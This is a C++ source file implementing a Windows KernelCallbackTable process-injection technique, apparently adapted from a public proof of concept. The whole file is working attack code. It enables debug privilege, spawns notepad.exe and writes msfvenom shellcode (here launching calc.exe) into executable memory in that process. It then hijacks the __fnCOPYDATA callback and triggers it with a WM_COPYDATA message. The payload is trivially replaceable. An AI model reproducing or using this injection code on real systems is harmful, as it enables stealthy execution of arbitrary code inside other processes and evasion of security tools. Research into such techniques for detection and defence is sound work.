/*
* Title: Kernel Callback Table Injection
* Resources:
*	- https://github.com/0xHossam/KernelCallbackTable-Injection-PoC
*/
#include <Windows.h>
#include <stdio.h>
#include "Nt.hpp"
#include "KernelCallbackTableInjection.hpp"

VOID Cleanup(HANDLE hProcess, HANDLE hThread, HANDLE hProcess2, LPVOID lpRemoteBuffer, LPVOID lpNewCCC) {
	if (lpRemoteBuffer)
		VirtualFreeEx(hProcess2, lpRemoteBuffer, 0, MEM_RELEASE);
	if (lpNewCCC)
		VirtualFreeEx(hProcess2, lpNewCCC, 0, MEM_RELEASE);
	if (hProcess2)
		CloseHandle(hProcess2);
	if (hThread)
		CloseHandle(hThread);
	if (hProcess) {
		TerminateProcess(hProcess, 0);
		CloseHandle(hProcess);
	}
}

BOOL EnableDebugPrivilege() {
	HANDLE hToken = nullptr;
	TOKEN_PRIVILEGES priv;

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &priv.Privileges[0].Luid);
	priv.PrivilegeCount = 1;
	priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if (!AdjustTokenPrivileges(hToken, FALSE, &priv, sizeof(priv), nullptr, nullptr)) {
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	return TRUE;
}

BOOL KernelCallbackTableInjection() {
	// Change the following values with the target processes and the window's class name to find.
	LPCWSTR lpTargetProcess = L"C:\\Windows\\System32\\notepad.exe";
	LPCWSTR lpClassName = L"Notepad";

	// Shellcode generated by `msfvenom -p windows/x64/exec CMD=calc.exe -f c`
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

	if (!EnableDebugPrivilege()) return FALSE;

	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	if (!hNtdll) return FALSE;
	_NtQueryInformationProcess ntQueryInformationProcess = reinterpret_cast<_NtQueryInformationProcess>(GetProcAddress(hNtdll, "NtQueryInformationProcess"));
	if (!ntQueryInformationProcess) return FALSE;

	// ----------------------------------------------------------------------------------- //
	// Create new process and find the window handle.
	// ----------------------------------------------------------------------------------- //

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	PROCESS_INFORMATION pi = { 0 };

	if (!CreateProcess(lpTargetProcess, nullptr, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi)) {
		Cleanup(pi.hProcess, pi.hThread, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Wait for the process to initialize.
	WaitForInputIdle(pi.hProcess, 1000);

	// Find the window handle.
	HWND hWindow = nullptr;
	DWORD dwWaitTime = 0;
	while (hWindow == nullptr && dwWaitTime < MAX_WAIT_TIME) {
		hWindow = FindWindow(lpClassName, nullptr);
		if (!hWindow) {
			Sleep(500);
			dwWaitTime += 500;
		}
	}
	if (!hWindow) {
		Cleanup(pi.hProcess, pi.hThread, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Get the PID.
	DWORD dwPid = 0;
	if (!GetWindowThreadProcessId(hWindow, &dwPid)) {
		Cleanup(pi.hProcess, pi.hThread, nullptr, nullptr, nullptr);
		return FALSE;
	}

	// Open the process handle.
	HANDLE hProcess = OpenProcess(
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
		FALSE,
		dwPid
	);
	if (!hProcess) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, nullptr, nullptr);
		return FALSE;
	}

	// ----------------------------------------------------------------------------------- //
	// Get PEB and read KernelCallbackTable.
	// ----------------------------------------------------------------------------------- //

	PROCESS_BASIC_INFORMATION pbi;
	ULONG returnLength = 0;
	NTSTATUS status = ntQueryInformationProcess(
		hProcess,
		ProcessBasicInformation,
		&pbi,
		sizeof(pbi),
		&returnLength
	);
	if (!NT_SUCCESS(status)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, nullptr, nullptr);
		return FALSE;
	}

	PVOID pPebBaseAddr = pbi.PebBaseAddress;

	// Read KernelCallbackTable from the PEB.
	PVOID pKernelCallbackTable = nullptr;
	SIZE_T dwBytesRead = 0;
	if (!ReadProcessMemory(
		hProcess,
		(PBYTE)pPebBaseAddr + offsetof(PEB, KernelCallbackTable),
		&pKernelCallbackTable,
		sizeof(PVOID),
		&dwBytesRead
	)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, nullptr, nullptr);
		return FALSE;
	}

	// Read KernelCallbackTable structure.
	KERNEL_CALLBACK_TABLE CCC;
	if (!ReadProcessMemory(
		hProcess,
		pKernelCallbackTable,
		&CCC,
		sizeof(CCC),
		&dwBytesRead
	)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, nullptr, nullptr);
		return FALSE;
	}

	// ----------------------------------------------------------------------------------- //
	// Write shellcode to remote process.
	// ----------------------------------------------------------------------------------- //

	LPVOID lpRemoteBuffer = VirtualAllocEx(
		hProcess,
		nullptr,
		sizeof(shellcode),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_EXECUTE_READWRITE
	);
	if (!lpRemoteBuffer) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, nullptr);
		return FALSE;
	}

	if (!WriteProcessMemory(hProcess, lpRemoteBuffer, shellcode, sizeof(shellcode), nullptr)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, nullptr);
		return FALSE;
	}

	// ----------------------------------------------------------------------------------- //
	// Manipulate KernelCallbackTable to execute our shellcode when a Windows message is sent.
	// ----------------------------------------------------------------------------------- //

	// Modify __fnCOPYDATA in the KernelCallbackTable.
	CCC.__fnCOPYDATA = (ULONG_PTR)lpRemoteBuffer;

	// Clone modified KernelCallbackTable.
	LPVOID lpNewCCC = VirtualAllocEx(
		hProcess,
		nullptr,
		sizeof(CCC),
		MEM_RESERVE | MEM_COMMIT,
		PAGE_READWRITE
	);
	if (!lpNewCCC) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, lpNewCCC);
		return FALSE;
	}
	if (!WriteProcessMemory(hProcess, lpNewCCC, &CCC, sizeof(CCC), nullptr)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, lpNewCCC);
		return FALSE;
	}

	// Overwrite the original KernelCallbackTable with the new one.
	if (!WriteProcessMemory(
		hProcess,
		(PBYTE)pPebBaseAddr + offsetof(PEB, KernelCallbackTable),
		&lpNewCCC,
		sizeof(PVOID),
		&dwBytesRead
	)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, lpNewCCC);
		return FALSE;
	}

	DWORD dwOldProtect = 0;
	if (!VirtualProtectEx(hProcess, lpRemoteBuffer, sizeof(shellcode), PAGE_EXECUTE_READ, &dwOldProtect)) {
		Cleanup(pi.hProcess, pi.hThread, hProcess, lpRemoteBuffer, lpNewCCC);
		return FALSE;
	}

	// ----------------------------------------------------------------------------------- //
	// Trigger the shellcode by sending a WM_COPYDATA message.
	// ----------------------------------------------------------------------------------- //

	COPYDATASTRUCT cds = {};
	WCHAR msg[] = L"Test";
	cds.dwData = 1;
	cds.cbData = (lstrlenW(msg) + 1) * sizeof(WCHAR);
	cds.lpData = msg;
	
	LRESULT result = SendMessage(hWindow, WM_COPYDATA, (WPARAM)hWindow, (LPARAM)&cds);
	if (result == 0 && GetLastError() != 0) {
		return FALSE;
	}

	Cleanup(pi.hProcess, pi.hThread, hProcess, nullptr, lpNewCCC);

	return TRUE;
}
